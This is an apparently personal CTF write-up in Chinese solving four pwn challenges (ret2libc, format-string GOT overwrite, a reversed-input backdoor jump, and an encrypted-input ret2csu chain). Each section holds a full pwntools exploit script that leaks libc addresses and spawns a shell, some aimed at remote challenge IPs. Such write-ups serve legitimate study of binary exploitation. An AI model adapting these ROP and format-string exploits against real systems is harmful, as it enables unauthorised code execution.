![[Pasted image 20241006180918.png]]
2024.10.6
# PWN
## ez_game
这周最简单的一道题，一道简单的ret2libc
![[Pasted image 20241005215022.png]]
![[Pasted image 20241005215127.png]]
![[Pasted image 20241005215110.png]]
构造exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./attachment')
    pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('101.200.139.65', 30780)

elf = ELF('./attachment')
lib = ELF('./libc-2.31.so')

ret = 0x400509
rdi = 0x400783
rsp = 0x40077d

put_got = elf.got['puts']
put_plt = elf.plt['puts']
main = elf.symbols['func']

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50) + p64(ret) + p64(rdi) + p64(put_got) + p64(put_plt) + p64(main)
p.sendline(payload)

p.recvuntil(b'again!!\n')

addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(addr))

libc_base = addr - lib.sym['puts']
system = libc_base + lib.sym['system']
binsh = libc_base + next(lib.search('/bin/sh'))

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50 + 8) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.sendline(payload)

p.interactive()
```
运行后获取`shell`
![[Pasted image 20241005215455.png]]
PS:两个payload构造的时候涉及的栈堆平衡还不是很懂，这里属于试错试出来的

## easy fmt
首先第一次遇到给ld-linux的题目，查了一下需要patchelf后把libc版本弄对
![[Pasted image 20241005215657.png]]
主要函数这里可以看出可以利用格式化字符串漏洞，用gdb调试一下
![[Pasted image 20241005215834.png]]
可以看到`canary`(这道题没用)和`__libc_start_main+128`
思路很明显，第一次，利用格式化字符串漏洞泄露`__libc_start_main`的地址后可以获取基址，从而获取`system`函数的地址，同时获取`printf`函数的got表地址；第二次，利用格式化字符串漏洞将`printf`函数换为`system`函数；第三次，输入`/bin/sh`，使`printf`函数实际执行`system`获取shell
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux')
context.log_level = 'debug'
local = True
if local:
    p = process('./ez_fmt')
    pwnlib.gdb.attach(p, 'b vuln')
else:
    p = remote('39.106.48.123', 28643)

libc = ELF('./libc.so.6')
elf = ELF('./ez_fmt')

offset = 8
payload = '%39$p'
p.recvuntil(b'data: \n')
p.sendline(payload)
receive = p.recvuntil(b'\n')
main_addr = int(receive, 16) - 128
log.info("main_addr: " + hex(main_addr))

printf_got = elf.got['printf']

base = main_addr - libc.symbols['__libc_start_main']
system_addr = base + libc.symbols['system']
log.info("system_addr: " + hex(system_addr))
print("printf_got: ", hex(printf_got))

payload = fmtstr_payload(offset, {printf_got: system_addr}, write_size='int')
  
print("len_payload: ", len(payload))
print("fmtstr_payload: ", payload)

p.sendafter(b'data: \n', payload)

p.recvuntil(b'data: \n')
p.sendline(b'/bin/sh\x00')

p.interactive()
```
![[Pasted image 20241005220952.png]]
注意点：因为`read`有大小限制，在使用`fmtstr_payload`时需限制`write_size`参数为`int`来缩短`payload`，不过会导致需要填充的字符数量很多，要填充一会
~~是哪个傻子获取`printf`的got时写成`elf.sym`，导致做了好几天没做出来，我不好说~~
## Inverted World
![[Pasted image 20241005221232.png]]
首先可以看到有一个backdoor函数，没什么思路，打开gdb调试一下
![[Pasted image 20241005221439.png]]
可以发现整个是逆序放入栈中的，那么只需要填充至`+008`处将`+008`处换为`backdoor`的地址就可以调用`backdoor`了
![[Pasted image 20241005221833.png]]
进入``backdoor``后发现还需要`hackable`为真时才能真正获取`shell`，不然会获得一个真“flag”，这里我没找到直接改变`hackable`的方法，我选择直接进入`if`里面
![[Pasted image 20241005222024.png]]
将覆盖地址改为`0x401387c则可以直接进入`if`内
构造exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./inverted_world')
    pwnlib.gdb.attach(p, 'b *read')
else:
    p = remote('39.106.48.123', 34234)

# 因read为倒叙读取，所以需要将输入的字符串倒叙输入
backdoor = 0x7c13400000000000

payload = b'a' * (0x100) + p64(backdoor)
p.sendline(payload)
p.interactive()
```
![[Pasted image 20241005222343.png]]
然后我们又会发现，这里的`read`他在需要倒叙输入的同时，还只能输入两个字符，除了`ls`我们什么都干不了.......
才怪，输入`sh`可以直接获取`shell`
![[Pasted image 20241005222549.png]]
接下来可以正常获取flag
## My_GBC!!!!!
![[Pasted image 20241006021055.png]]
首先进行`gdb`调试，可以发现把我们的输入经由`encrypt`后存在栈上，可以栈溢出，所以可以将`payload`反向解密后注入，让其加密后成为我们实际输入的`payload`即可
解决栈溢出的问题后，考虑如何进一步，初步看来以为是一个`ret2libc`，利用`write`函数泄露地址
![[Pasted image 20241006021530.png]]
但实际运行时发现我们无法获取`rdx`的`gadget`，便无法修改`write`的输出数量，实际运行也可以看出仅能输出一位
![[Pasted image 20241006021707.png]]
所以普通的`ret2libc`打不通。
所以这里使用的是`ret2csu`，![[Pasted image 20241006021812.png]]
即先调用`loc_4013A6`往`r12,r13,r14,r15`放入我们的值，然后调用`loc_401390`将`r14,r13,r12`的值分别存入`rdx,rsi,rdi`，再跳转到`r15`
具体构造payload:
```python
payload = b'a' * 0x18
payload += p64(csu_1)
payload += p64(0) + p64(1)
# r12 r13 r14 r15 -> rdi rsi rdx call
payload += p64(1) + p64(leak_got) + p64(8) + p64(leak_got)
payload += p64(csu_2) + b'a' * 0x38
payload += p64(main)
```
完整exp:
```python
from pwn import *

def ror1(byte, count):
    return ((byte >> count) | (byte << (8 - count))) & 0xFF

def decrypt(data, key, length):
    decrypted_data = bytearray()
    for i in range(length):
        byte = data[i]
        byte = ror1(byte, 3)  # 右循环移位3位
        byte ^= key  # 异或操作
        decrypted_data.append(byte)
    return decrypted_data

context.log_level = 'debug'
local = True
elf = ELF('./My_GBC')
libc = ELF('./libc.so.6')
if local:
    p = process('./My_GBC')
    pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('39.106.48.123', 32325)
key = 0x5a

ret = 0x40101a
rdi = 0x4013b3
rsi = 0x4013b1

csu_1 = 0x4013Aa
csu_2 = 0x401390

write_plt = 0x401060
leak_got = elf.got['write']
main = elf.symbols['main']

'''payload = b'a' * 0x18
payload += p64(rdi) + p64(1)
payload += p64(rsi) + p64(leak_got) + p64(8)
payload += p64(write_plt) + p64(main)'''
payload = b'a' * 0x18
payload += p64(csu_1)
payload += p64(0) + p64(1)
# r12 r13 r14 r15 -> rdi rsi rdx call
payload += p64(1) + p64(leak_got) + p64(8) + p64(leak_got)
payload += p64(csu_2) + b'a' * 0x38
payload += p64(main)

payload = decrypt(payload, key, len(payload))

# Send the payload
p.sendline(payload)
  
p.recvuntil(b'Encrypted: ')
p.recvuntil(b'\n')
leaked_address = u64(p.recv(8))
print(f'Leaked address: {hex(leaked_address)}')

base = leaked_address - libc.symbols['write']
print(f'Libc base: {hex(base)}')
system = base + libc.symbols['system']
bin_sh = base + next(libc.search(b'/bin/sh'))

payload = b'a' * 0x18 + p64(ret)
payload += p64(rdi)
payload += p64(bin_sh)
payload += p64(system)

payload = decrypt(payload, key, len(payload))
p.sendline(payload)
p.interactive()
```
![[Pasted image 20241006022233.png]]
运行后获取flag
